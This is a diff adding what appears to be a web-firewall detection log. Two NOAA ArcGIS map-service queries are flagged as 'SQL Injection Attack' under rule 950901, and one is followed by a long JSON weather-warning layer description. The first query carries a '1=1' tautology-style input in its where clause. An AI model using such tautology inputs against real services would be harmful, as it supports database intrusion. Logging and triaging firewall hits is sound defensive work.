@@ -1,0 +1,732 @@
+950901 SQL Injection Attack
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Forecasts_Guidance_Warnings/watch_warn_adv/MapServer/1/query%20?f=json&where=(prod_type%20LIKE%20%27%25Winter%25%27)%20AND%20(1%3D1)&returnGeometry=false&spatialRel=esriSpatialRelIntersects&outFields=*&orderByFields=objectid%20ASC&outSR=102100&resultOffset=0&resultRecordCount=50
+{"currentVersion":10.5,"id":1,"name":"WatchesWarnings","type":"Feature Layer","description":"","geometryType":"esriGeometryPolygon","sourceSpatialReference":{"wkid":4269,"latestWkid":4269},"copyrightText":"","parentLayer":null,"subLayers":[],"minScale":0,"maxScale":0,"drawingInfo":{"renderer":{"type":"uniqueValue","field1":"phenom","field2":"sig","field3":"msg_type","defaultSymbol":null,"defaultLabel":null,"uniqueValueInfos":[{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[128,128,128,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"AS,Y,NPW","label":"Air Stagnation Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[105,105,105,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"MH,Y,MWW","label":"Ashfall Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[105,105,105,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"AF,Y,NPW","label":"Ashfall Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[169,169,169,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"MH,W,MWW","label":"Ashfall Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[64,244,208,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"BH,S,CFW","label":"Beach Hazard Statement","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,69,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"BZ,W,WSW","label":"Blizzard Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[173,255,47,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"BZ,A,WSW","label":"Blizzard Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[189,183,107,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"DU,Y,NPW","label":"Blowing Dust Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[216,191,216,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"BW,Y,MWW","label":"Brisk Wind Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[124,252,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"CF,Y,CFW","label":"Coastal Flood Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[34,139,34,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"CF,W,CFW","label":"Coastal Flood Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[102,205,170,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"CF,A,CFW","label":"Coastal Flood Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[112,128,144,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"MF,Y,MWW","label":"Dense Fog Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[112,128,144,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FG,Y,NPW","label":"Dense Fog Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[240,230,140,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"MS,Y,MWW","label":"Dense Smoke Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[240,230,140,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SM,Y,NPW","label":"Dense Smoke Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,228,196,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"DS,W,NPW","label":"Dust Strom Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[199,21,133,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"EH,W,NPW","label":"Excessive Heat Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[128,0,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"EH,A,NPW","label":"Excessive Heat Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,140,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"EW,W,EWW","label":"Extreme Wind Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,222,173,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FW,A,RFW","label":"Fire Weather Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[139,0,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FF,W,FFS","label":"Flash Flood Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[139,0,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FF,W,FFW","label":"Flash Flood Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[46,139,87,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FF,A,FFA","label":"Flash Flood Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,255,127,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FA,Y,FLS","label":"Flood Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,255,127,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FL,Y,FLS","label":"Flood Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,255,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FA,W,FLS","label":"Flood Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,255,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FA,W,FLW","label":"Flood Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,255,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FL,W,FLW","label":"Flood Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,255,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FL,W,FLS","label":"Flood Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[46,139,87,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FA,A,FFA","label":"Flood Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[46,139,87,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FL,A,FFA","label":"Flood Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[72,61,139,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FZ,W,NPW","label":"Freeze Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,255,255,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FZ,A,NPW","label":"Freeze Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,128,128,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"ZF,Y,NPW","label":"Freezing Fog Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[218,112,214,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"ZR,Y,WSW","label":"Freezing Rain Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[100,149,237,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FR,Y,NPW","label":"Frost Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[221,160,221,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"GL,W,MWW","label":"Gale Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,192,203,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"GL,A,MWW","label":"Gale Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[148,0,211,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HZ,W,NPW","label":"Hard Freeze Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[65,105,225,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HZ,A,NPW","label":"Hard Freeze Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[216,191,216,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SE,W,MWW","label":"Hazardous Seas Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[72,61,139,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SE,A,MWW","label":"Hazardous Seas Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,127,80,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HT,Y,NPW","label":"Heat Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,0,0,0],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"UP,Y,MWW","label":"Heavy Freezing Spray Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,191,255,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"UP,W,MWW","label":"Heavy Freezing Spray Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[188,143,143,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"UP,A,MWW","label":"Heavy Freezing Spray Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[186,85,211,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SU,Y,CFW","label":"High Surf Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[34,139,34,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SU,W,CFW","label":"High Surf Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[218,165,32,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HW,W,NPW","label":"High Wind Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[184,134,11,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HW,A,NPW","label":"High Wind Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[205,92,92,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HF,W,MWW","label":"Hurricane Force Wind Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[153,50,204,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HF,A,MWW","label":"Hurricane Force Wind Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[220,20,60,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HU,W,MWW","label":"Hurricane Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[220,20,60,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HU,W,TCV","label":"Hurricane Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,0,255,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HU,A,MWW","label":"Hurricane Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,0,255,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HU,A,TCV","label":"Hurricane Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,0,0,0],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HI,W,HLS","label":"Hurricane Wind Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,0,0,0],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"HI,A,HLS","label":"Hurricane Wind Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[139,0,139,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"IS,W,WSW","label":"Ice Strom Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[72,209,204,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"LE,Y,WSW","label":"Lake Effect Snow Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,139,139,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"LE,W,WSW","label":"Lake Effect Snow Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[135,206,250,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"LE,A,WSW","label":"Lake Effect Snow Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[210,180,140,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"LW,Y,NPW","label":"Lake Wind Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[124,252,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"LS,Y,CFW","label":"Lakeshore Flood Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[34,139,34,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"LS,W,CFW","label":"Lakeshore Flood Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[102,205,170,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"LS,A,CFW","label":"Lakeshore Flood Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[165,42,42,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"LO,Y,MWW","label":"Low Water Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,20,147,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"FW,W,RFW","label":"Red Flag Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[64,224,208,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"RP,S,CFW","label":"Rip Current Statement","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,165,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SV,W,SVR","label":"Severe Thunderstorm Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,165,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SV,W,SVS","label":"Severe Thunderstorm Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[219,112,147,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SV,A,WCN","label":"Severe Thunderstorm Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[216,191,216,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SC,Y,MWW","label":"Small Craft Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[216,191,216,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SW,Y,MWW","label":"Small Craft Advisory for Hazardous Seas","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[216,191,216,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"RB,Y,MWW","label":"Small Craft Advisory for Rough Bar","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[216,191,216,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SI,Y,MWW","label":"Small Craft Advisory for Winds","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,165,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"MA,W,SMW","label":"Special Marine Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[219,127,147,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SS,A,MWW","label":"Storm Surge Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[219,127,147,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SS,A,TCV","label":"Storm Surge Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[181,36,247,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SS,W,MWW","label":"Storm Surge Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[181,36,247,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SS,W,TCV","label":"Storm Surge Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[148,0,211,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SR,W,MWW","label":"Storm Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,228,181,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"SR,A,MWW","label":"Storm Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,0,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TO,W,SVS","label":"Tornado Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,0,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TO,W,TOR","label":"Tornado Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,255,0,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TO,A,WCN","label":"Tornado Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,0,0,0],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TI,W,HLS","label":"Tropical Storm Wind Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[0,0,0,0],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TI,A,HLS","label":"Tropical Storm Wind Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[178,34,34,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TR,W,MWW","label":"Tropical Storm Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[178,34,34,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TR,W,TCV","label":"Tropical Storm Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[240,128,128,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TR,A,MWW","label":"Tropical Storm Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[240,128,128,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TR,A,TCV","label":"Tropical Storm Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[210,105,30,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TS,Y,TSU","label":"Tsunami Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[253,99,71,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TS,W,TSU","label":"Tsunami Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,0,255,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TS,A,TSU","label":"Tsunami Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[220,20,60,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TY,W,HLS","label":"Typhoon Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,0,255,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"TY,A,HLS","label":"Typhoon Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[210,180,140,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"WI,Y,NPW","label":"Wind Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[175,238,238,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"WC,Y,WSW","label":"Wind Chill Advisory","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[176,196,222,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"WC,W,WSW","label":"Wind Chill Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[95,158,160,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"WC,A,WSW","label":"Wind Chill Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[255,105,180,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"WS,W,WSW","label":"Winter Storm Warning","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[70,130,180,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"WS,A,WSW","label":"Winter Storm Watch","description":""},{"symbol":{"type":"esriSFS","style":"esriSFSSolid","color":[123,104,238,255],"outline":{"type":"esriSLS","style":"esriSLSSolid","color":[0,0,0,255],"width":0.4}},"value":"WW,Y,WSW","label":"Winter Weather Advisory","description":""}],"fieldDelimiter":","},"transparency":0,"labelingInfo":null},"defaultVisibility":true,"extent":{"xmin":-179.147338754,"ymin":0,"xmax":179.77847999999994,"ymax":71.389610291,"spatialReference":{"wkid":4269,"latestWkid":4269}},"hasAttachments":false,"htmlPopupType":"esriServerHTMLPopupTypeAsHTMLText","displayField":"phenom","typeIdField":null,"fields":[{"name":"objectid","type":"esriFieldTypeOID","alias":"OBJECTID","domain":null},{"name":"phenom","type":"esriFieldTypeString","alias":"phenom","length":2,"domain":null},{"name":"sig","type":"esriFieldTypeString","alias":"sig","length":2,"domain":null},{"name":"warnid","type":"esriFieldTypeString","alias":"warnid","length":64,"domain":null},{"name":"wfo","type":"esriFieldTypeString","alias":"wfo","length":4,"domain":null},{"name":"event","type":"esriFieldTypeString","alias":"event","length":4,"domain":null},{"name":"issuance","type":"esriFieldTypeString","alias":"issuance","length":30,"domain":null},{"name":"expiration","type":"esriFieldTypeString","alias":"expiration","length":30,"domain":null},{"name":"url","type":"esriFieldTypeString","alias":"url","length":128,"domain":null},{"name":"msg_type","type":"esriFieldTypeString","alias":"msg_type","length":4,"domain":null},{"name":"prod_type","type":"esriFieldTypeString","alias":"prod_type","length":64,"domain":null},{"name":"idp_source","type":"esriFieldTypeString","alias":"IDP_Source","length":50,"domain":null},{"name":"idp_subset","type":"esriFieldTypeString","alias":"IDP_Subset","length":50,"domain":null},{"name":"idp_filedate","type":"esriFieldTypeDate","alias":"IDP_FileDate","length":8,"domain":null},{"name":"idp_ingestdate","type":"esriFieldTypeDate","alias":"IDP_IngestDate","length":8,"domain":null},{"name":"idp_current_forecast","type":"esriFieldTypeInteger","alias":"IDP_Current_Forecast","domain":null},{"name":"idp_time_series","type":"esriFieldTypeInteger","alias":"IDP_Time_Series","domain":null},{"name":"idp_issueddate","type":"esriFieldTypeDate","alias":"IDP_IssuedDate","length":8,"domain":null},{"name":"idp_validtime","type":"esriFieldTypeDate","alias":"IDP_ValidTime","length":8,"domain":null},{"name":"idp_validendtime","type":"esriFieldTypeDate","alias":"IDP_ValidEndTime","length":8,"domain":null},{"name":"idp_fcst_hour","type":"esriFieldTypeInteger","alias":"IDP_FCST_HOUR","domain":null},{"name":"shape","type":"esriFieldTypeGeometry","alias":"SHAPE","domain":null},{"name":"st_area(shape)","type":"esriFieldTypeDouble","alias":"st_area(shape)","domain":null},{"name":"st_length(shape)","type":"esriFieldTypeDouble","alias":"st_length(shape)","domain":null}],"indexes":[{"name":"r413_sde_rowid_uk","fields":"objectid","isAscending":true,"isUnique":true,"description":""},{"name":"a316_ix1","fields":"shape","isAscending":true,"isUnique":true,"description":""}],"relationships":[],"canModifyLayer":false,"canScaleSymbols":false,"hasLabels":false,"capabilities":"Map,Query,Data","maxRecordCount":4000,"supportsStatistics":true,"supportsAdvancedQueries":true,"supportedQueryFormats":"JSON, AMF, geoJSON","ownershipBasedAccessControlForFeatures":{"allowOthersToQuery":true},"useStandardizedQueries":true,"advancedQueryCapabilities":{"useStandardizedQueries":true,"supportsStatistics":true,"supportsOrderBy":true,"supportsDistinct":true,"supportsPagination":true,"supportsTrueCurve":true,"supportsReturningQueryExtent":true,"supportsQueryWithDistance":true,"supportsSqlExpression":true},"supportsDatumTransformation":true,"dateFieldsTimeReference":null}
+
+959071 SQL Injection Attack
+Status = 200
+https://idpgis.ncep.noaa.gov/arcgis/rest/services/NWS_Observations/ahps_riv_gauges/MapServer/0/query?f=json&where=gaugelid%20%3D%20%27LNSM4%27%20OR%20gaugelid%20%3D%20%27ELNM4%27%20OR%20gaugelid%20%3D%20%27HHTM4%27%20OR%20gaugelid%20%3D%20%27DMDM4%27%20OR%20gaugelid%20%3D%20%27GLDM4%27&returnGeometry=true&spatialRel=esriSpatialRelIntersects&geometry=%7B%22xmin%22%3A-9431717.794177745%2C%22ymin%22%3A5273543.455469495%2C%22xmax%22%3A-9421933.854557255%2C%22ymax%22%3A5283327.395089984%2C%22spatialReference%22%3A%7B%22wkid%22%3A102100%2C%22latestWkid%22%3A3857%7D%7D&geometryType=esriGeometryEnvelope&inSR=102100&outFields=*&outSR=102100
